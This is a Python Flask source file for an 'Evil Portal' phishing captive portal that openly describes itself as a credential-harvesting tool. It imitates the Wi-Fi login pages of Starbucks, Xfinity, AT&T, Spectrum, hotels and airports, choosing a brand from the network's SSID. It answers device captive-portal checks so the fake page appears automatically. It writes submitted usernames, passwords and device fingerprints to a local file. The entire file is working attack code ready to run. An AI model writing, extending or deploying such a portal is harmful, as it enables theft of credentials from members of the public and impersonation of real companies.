#!/usr/bin/env python3
"""
Evil Portal Framework v2 - Universal Edition
Captive portal with adaptive branding, device fingerprinting, and credential harvesting.
Detects network context and adapts portal appearance accordingly.
"""

import os
import json
import time
import argparse
import re
from datetime import datetime
from flask import Flask, render_template, request, redirect, jsonify, make_response

app = Flask(__name__)

CREDS_FILE = "creds.json"
LOG_FILE = "access.log"

# Universal network profiles - adapts based on SSID or manual override
NETWORK_PROFILES = {
    "default": {
        "title": "Network Login",
        "subtitle": "Sign in to continue",
        "brand": "Secure Network",
        "icon": "🔒",
        "color": "#667eea",
        "footer": "Need help? Contact your network administrator",
        "support_phone": "1-800-NET-HELP",
        "terms_text": "By connecting, you agree to the network terms of use"
    },
    "starbucks": {
        "title": "Starbucks WiFi",
        "subtitle": "Welcome! Sign in for free WiFi",
        "brand": "Starbucks",
        "icon": "☕",
        "color": "#00704A",
        "footer": "Need help? Ask a barista or call",
        "support_phone": "1-800-STARBUCKS",
        "terms_text": "By connecting, you agree to Starbucks WiFi Terms of Service"
    },
    "xfinity": {
        "title": "Xfinity WiFi",
        "subtitle": "Sign in with your Xfinity account",
        "brand": "Xfinity",
        "icon": "📡",
        "color": "#000000",
        "footer": "Xfinity WiFi support",
        "support_phone": "1-800-XFINITY",
        "terms_text": "By using Xfinity WiFi, you agree to Comcast terms"
    },
    "att": {
        "title": "AT&T Wi-Fi",
        "subtitle": "Enter your AT&T credentials to connect",
        "brand": "AT&T",
        "icon": "🌐",
        "color": "#00A8E0",
        "footer": "AT&T Wi-Fi Hotspot support",
        "support_phone": "1-800-ATT-WIFI",
        "terms_text": "By connecting, you agree to AT&T Wi-Fi terms"
    },
    "hotel": {
        "title": "Hotel WiFi Access",
        "subtitle": "Enter your room number and last name",
        "brand": "Guest Services",
        "icon": "🏨",
        "color": "#8B4513",
        "footer": "Front desk available 24/7",
        "support_phone": "Dial 0 from your room",
        "terms_text": "By connecting, you agree to hotel network policies"
    },
    "airport": {
        "title": "Airport Free WiFi",
        "subtitle": "Complimentary internet access",
        "brand": "Airport Authority",
        "icon": "✈️",
        "color": "#1e3a8a",
        "footer": "Visit the information desk for assistance",
        "support_phone": "Airport Info Line",
        "terms_text": "By connecting, you agree to airport network terms"
    },
    "spectrum": {
        "title": "Spectrum WiFi",
        "subtitle": "Sign in with your Spectrum account",
        "brand": "Spectrum",
        "icon": "📶",
        "color": "#003057",
        "footer": "Spectrum WiFi support",
        "support_phone": "1-855-SPECTRUM",
        "terms_text": "By connecting, you agree to Spectrum terms"
    }
}

def log_access(data):
    entry = {
        "timestamp": datetime.now().isoformat(),
        "ip": request.remote_addr,
        "user_agent": request.headers.get("User-Agent", "Unknown"),
        "path": request.path,
        "data": data
    }
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")

def save_creds(username, password, fingerprint, profile="default"):
    entry = {
        "timestamp": datetime.now().isoformat(),
        "ip": request.remote_addr,
        "username": username,
        "password": password,
        "fingerprint": fingerprint,
        "profile": profile,
        "user_agent": request.headers.get("User-Agent", "Unknown")
    }
    creds = []
    if os.path.exists(CREDS_FILE):
        with open(CREDS_FILE, "r") as f:
            try:
                creds = json.load(f)
            except:
                creds = []
    creds.append(entry)
    with open(CREDS_FILE, "w") as f:
        json.dump(creds, f, indent=2)

def detect_device(ua):
    ua = ua.lower()
    if "iphone" in ua or "ipad" in ua or "ipod" in ua:
        return "ios"
    elif "android" in ua:
        return "android"
    elif "windows" in ua:
        return "windows"
    elif "macintosh" in ua or "mac os" in ua:
        return "macos"
    elif "linux" in ua:
        return "linux"
    return "unknown"

def get_profile_from_ssid(ssid=""):
    """Auto-detect profile based on SSID name."""
    ssid_lower = ssid.lower()
    if any(x in ssid_lower for x in ["starbucks", "sbux"]):
        return "starbucks"
    elif any(x in ssid_lower for x in ["xfinity", "xfi"]):
        return "xfinity"
    elif any(x in ssid_lower for x in ["attwifi", "at&t"]):
        return "att"
    elif any(x in ssid_lower for x in ["spectrum", "twc"]):
        return "spectrum"
    elif any(x in ssid_lower for x in ["hotel", "guest", "hilton", "marriott", "hyatt"]):
        return "hotel"
    elif any(x in ssid_lower for x in ["airport", "fly", "terminal"]):
        return "airport"
    return "default"

@app.route("/")
def index():
    ua = request.headers.get("User-Agent", "")
    device = detect_device(ua)

    # Check for profile override in query param or cookie
    profile_name = request.args.get("profile", "")
    if not profile_name:
        profile_name = request.cookies.get("portal_profile", "default")

    # Auto-detect from Referer or default
    ssid = request.args.get("ssid", "")
    if not profile_name or profile_name == "default":
        profile_name = get_profile_from_ssid(ssid)

    profile = NETWORK_PROFILES.get(profile_name, NETWORK_PROFILES["default"])
    log_access({"event": "portal_load", "device": device, "profile": profile_name})

    resp = make_response(render_template("index.html", device=device, profile=profile, profile_name=profile_name))
    resp.set_cookie("portal_profile", profile_name, max_age=3600)
    return resp

@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username", "")
    password = request.form.get("password", "")
    fingerprint = request.form.get("fingerprint", "")
    profile_name = request.form.get("profile_name", "default")

    save_creds(username, password, fingerprint, profile_name)
    log_access({"event": "credential_submit", "username": username, "profile": profile_name})

    return redirect("/success")

@app.route("/success")
def success():
    log_access({"event": "success_page"})
    return render_template("success.html")

# Captive portal detection endpoints
@app.route("/generate_204")
def generate_204():
    return "", 204

@app.route("/hotspot-detect.html")
def apple_captive():
    return redirect("/")

@app.route("/library/test/success.html")
def apple_captive_alt():
    return redirect("/")

@app.route("/ncsi.txt")
def windows_captive():
    return "Microsoft NCSI", 200

@app.route("/connecttest.txt")
def windows_connecttest():
    return "Microsoft Connect Test", 200

@app.route("/redirect")
def redirect_portal():
    return redirect("/")

@app.route("/api/fingerprint", methods=["POST"])
def fingerprint():
    data = request.get_json()
    log_access({"event": "fingerprint", "data": data})
    return jsonify({"status": "ok"})

# Additional endpoints for realism
@app.route("/favicon.ico")
def favicon():
    return "", 204

@app.route("/robots.txt")
def robots():
    return "User-agent: *\nDisallow: /", 200

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Evil Portal Framework v2")
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=80)
    parser.add_argument("--interface", default="wlan0")
    parser.add_argument("--profile", default="default", help="Network profile: default, starbucks, xfinity, att, hotel, airport, spectrum")
    args = parser.parse_args()

    print(f"[*] Evil Portal v2 starting on {args.host}:{args.port}")
    print(f"[*] Interface: {args.interface}")
    print(f"[*] Default Profile: {args.profile}")
    print(f"[*] Logs: {LOG_FILE}")
    print(f"[*] Creds: {CREDS_FILE}")
    print("[*] Ready to harvest...")

    app.run(host=args.host, port=args.port, threaded=True)
